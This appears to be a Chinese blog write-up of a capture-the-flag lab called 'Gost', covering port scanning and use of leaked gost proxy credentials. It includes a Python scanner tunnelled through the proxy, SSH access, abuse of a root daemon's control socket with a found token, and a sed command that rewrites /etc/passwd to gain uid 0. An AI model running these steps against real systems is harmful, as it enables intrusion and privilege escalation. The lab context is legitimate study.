---
title: "Gost 靶场 WP"
date: 2026-06-12
draft: false
description: "Gost 靶场的完整过程记录，包含代理访问、Unix Socket 与权限提升。"
summary: "记录 Gost 靶场从代理认证、内网服务探测到 system-ctrl.sock 控制接口提权的完整过程。"
tags:
  - 靶机
  - Gost
  - Linux
categories:
  - 靶机
ShowToc: true
---

# Gost靶场WP

## user

### 拿到靶场IP地址后先用nmap扫描哪些端口开放以及查看端口信息

![](./images/Snipaste_2026-06-12_16-35-50.jpg)

分析一下：开放了3个端口

* 80端口：部署了HTTP服务，名字叫Dashboard - Maze Cyber Ops
* 1680端口：部署了http代理服务，gost 代理，需要认证
* 9000端口：部署了Go 写的 HTTP 服务

### 先访问80端口

![](./images/Snipaste_2026-06-12_17-00-09.jpg)

主页中提供的信息不多，目前处于root账户，且密码复杂较低，且主页几乎不可交互，信息过少，使用dirsearch工具扫描一下目录

![](./images/Snipaste_2026-06-12_17-14-13.jpg)

访问admin目录

![](./images/Snipaste_2026-06-12_17-15-14.jpg)

访问config文件得到如下信息

```
{
  "services": [
    {
      "name": "service-0",
      "addr": ":1680",
      "handler": {
        "type": "auto",
        "auth": {
          "username": "root",
          "password": "123"
        }
      },
      "listener": {
        "type": "tcp"
      }
    }
  ],
  "api": {
    "addr": "127.0.0.1:53000"
  },
  "metrics": {
    "addr": "0.0.0.0:9000"
  }
}
```

得到信息：

* 1680端口上的代理用户名和密码分别为root和123，又因为上面的代理为gost代理，最常用的认证形式为用户名:密码的basic认证，可以用curl命令尝试一下

* 9000端口上的服务是gost的metrics监控服务，gost的metrics监控服务默认会暴露一些gost的运行状态信息，可以访问一下看看

* 53000端口上的服务是gost的api服务，需要本地访问

直接访问9000端口发现没有内容，考虑到metrics服务可能在metrics目录下，访问该目录成功，不过没啥关键信息

![](./images/Snipaste_2026-06-12_17-29-31.jpg)

### 使用1680代理访问

使用命令`curl -v --noproxy "" --proxy-basic -x http://root:123@192.168.56.106:1680 http://127.0.0.1:53000/`访问gost的api服务（这里需要使用--noproxy是因为curl会默认对本地回环地址不走代理，使用--noproxy ""限制）

![](./images/Snipaste_2026-06-12_17-40-32.jpg)

看到成功连接并且代理认证成功，只是没有内容，使用dirsearch工具配置代理扫描一下53000端口的目录

![](./images/Snipaste_2026-06-12_18-08-36.jpg)

使用curl访问config和docs目录

![](./images/Snipaste_2026-06-12_18-10-06.jpg)

![](./images/Snipaste_2026-06-12_18-11-33.jpg)

没啥信息，不过可以尝试用代理扫一下127.0.0.1的端口看看开放了哪些服务，因无法使用nmap连接这种basic认证的扫描，自己写了个python脚本来扫描一下常见端口

``` python
import socket, base64

proxy_host, proxy_port = '192.168.56.106', 1680
target_host = '127.0.0.1'
auth = base64.b64encode(b'root:123').decode()

ports = [22, 80, 443, 9000, 53000]

for port in ports:
    s = None
    try:
        s = socket.create_connection((proxy_host, proxy_port), timeout=2)
        req = (
            f'CONNECT {target_host}:{port} HTTP/1.1\r\n'
            f'Host: {target_host}:{port}\r\n'
            f'Proxy-Authorization: Basic {auth}\r\n'
            f'\r\n'
        )
        s.sendall(req.encode())
        resp = s.recv(256).decode('latin1', 'replace')
        first_line = resp.split('\r\n', 1)[0]
        print(f'{port}: {first_line}')
    except Exception as e:
        print(f'{port}: ERROR {e}')
    finally:
        if s:
            s.close()
```

显示
```
22: HTTP/1.1 200 Connection established
80: HTTP/1.1 200 Connection established
443: HTTP/1.1 503 Service Unavailable
9000: HTTP/1.1 200 Connection established
53000: HTTP/1.1 200 Connection established
```

由于22端口是ssh服务的默认端口，可以尝试使用ncat+ssh配置代理连接一下看看

![](./images/Snipaste_2026-06-12_18-28-00.jpg)

连接成功，提示让我输入密码，由于该账户为root账户，且代理密码为123，使用这个密码尝试成功登录，获取user的flag：

flag{user-44076b5021644b9af93dff0d7afb9f7d}

## root

进入该系统后，尝试一些指令获取基本信息

![](./images/Snipaste_2026-06-12_19-37-31.jpg)

可以看到，当前用户为root但是没有管理员权限，目前系统进程中有个python进程在/root/daemon.py运行，还有个gost进程运行

又查看了/etc/passwd文件，发现todd才是uid=0的管理员

![](./images/Snipaste_2026-06-12_19-42-35.jpg)

最终找了一圈下来感觉还是运行在/root目录下的daemon.py比较可疑，先在/run目录中看看，因为 /run 是 Linux 里专门放“运行时临时状态”的地方，可能会有一些线索

![](./images/Snipaste_2026-06-12_19-54-48.jpg)

里面发现了system-ctrl文件，/run/system-ctrl.sock 很可能是 /root/daemon.py 的控制接口，很可能拥有管理员权限，同时我使用ls -l看了这个文件属于video组，而root用户也属于video组，权限为rw-，可以连接

写了个连接脚本

``` python
#!/usr/bin/env python3

import socket

path = "/run/system-ctrl.sock"
message = "help\n"

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect(path)
s.sendall(message.encode())
print(s.recv(4096).decode())
s.close()
```

运行后发现需要以TOKEN|COMMAND的格式输入命令，目前没有token，尝试find找一下

![](./images/Snipaste_2026-06-12_20-14-07.jpg)

找到一个.secret_token文件，里面存放着18f2f59ca31f053a80ae7345de0a2198，这个就是token

改一下message继续

![](./images/Snipaste_2026-06-12_20-16-34.jpg)

这里给出了command的内容，其中exec_script命令可以执行脚本，刚好家目录有个hello.sh没权限运行，尝试一下

![](./images/Snipaste_2026-06-12_20-20-13.jpg)

执行了，但是没有输出，使用sudo -v试了一下，发现没有sudo命令，又用su -v试了一下，能用，暴力修改一下/etc/passwd，将root的uid改为0

```shell
#!/bin/sh
exec sed -i 's/^\(root:[^:]*:\)[0-9]\+:[0-9]\+\(:.*\)/\10:0\2/' "/etc/passwd"
```

运行并重新登录，获取root shell，查看flag

![](./images/Snipaste_2026-06-12_21-05-31.jpg)

![](./images/Snipaste_2026-06-12_21-06-00.jpg)

flag{root-20d6105f4a0baf7ab1dcd91ee5e919e7}